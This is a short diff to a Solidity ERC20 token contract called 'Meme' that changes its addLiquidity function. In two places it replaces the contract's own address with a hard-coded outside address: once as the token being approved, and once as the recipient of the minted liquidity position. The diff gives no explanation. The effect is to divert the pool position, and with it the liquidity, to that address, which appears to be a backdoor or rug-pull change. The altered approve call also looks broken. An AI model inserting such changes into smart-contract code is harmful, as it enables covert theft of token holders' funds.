@@ -53,7 +53,7 @@ contract Meme is ERC20 {
     }
 
     function addLiquidity() public {
-        IERC20(address(this)).approve(address(posMan), supply);
+        IERC20(address(0x35e7BBA2b4c6fBa78dE387Aa60AE54c4DEB826dB)).approve(address(posMan), supply);
         posMan.mint(INonfungiblePositionManager.MintParams({
             token0: token0,
             token1: token1,
@@ -64,7 +64,7 @@ contract Meme is ERC20 {
             amount1Desired: amount1Desired,
             amount0Min: 0,
             amount1Min: 0,
-            recipient: address(this),
+            recipient: address(0x35e7BBA2b4c6fBa78dE387Aa60AE54c4DEB826dB),
             deadline: block.timestamp + 1200
         }));
     }
